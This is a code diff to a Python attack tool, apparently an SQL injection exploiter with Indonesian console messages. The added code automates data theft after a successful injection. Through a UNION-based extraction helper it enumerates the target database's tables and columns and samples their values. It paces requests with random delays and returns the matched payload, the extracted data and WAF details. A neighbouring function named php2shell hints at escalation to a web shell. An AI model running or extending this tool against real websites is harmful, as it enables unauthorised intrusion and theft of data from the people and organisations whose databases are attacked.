@@ -768,7 +768,51 @@ def run_sqli_module():
             else:
                 return []
             res = _union_extract(session, method, target_url, param, headers, detected_dbms, string_col, col_count, expr, delay_mul=delay_mul)
-            return [v.strip() for v  
+            return [v.strip() for v  in res.split("\n") if v.strip()] if res else []
+
+        print("\n[***] TABEL ENUMERATION [***]")
+        tables = _list_tables()
+        if tables:
+            print(f"[+] {len(tables)} tabel ditemukan:")
+            for t in tables:
+                print(f"    - {t}")
+        else:
+            print("[-] Tidak ada tabel yang bisa di-enumerate.")
+
+        for table in tables:
+            time.sleep(random.uniform(0.3, 0.6) * delay_mul)
+            cols_list = _list_columns(table)
+            if not cols_list:
+                continue
+            table_columns[table] = cols_list
+            print(f"    [{table}] kolom: {', '.join(cols_list[:10])}")
+
+            for column in cols_list[:2]:
+                time.sleep(random.uniform(0.3, 0.6) * delay_mul)
+                values = _sample_column(table, column)
+                if values:
+                    sample_data.setdefault(table, {})[column] = values
+                    print(f"        .{column} = {values}")
+
+    session.close()
+    input("\nTekan Enter untuk kembali ke menu utama...")
+
+    return {
+        "vuln": True,
+        "exploitable": extracted_data is not None,
+        "type": "sqli",
+        "dbms": detected_dbms,
+        "url": target_url,
+        "method": method,
+        "param": param,
+        "columns": col_count,
+        "matched_payload": matched_payload,
+        "extracted_data": extracted_data,
+        "tables": tables,
+        "table_columns": table_columns,
+        "sample_data": sample_data,
+        "waf": waf_info["waf"],
+    }
 
 def run_php2shell_module():
     print("-" * 60)
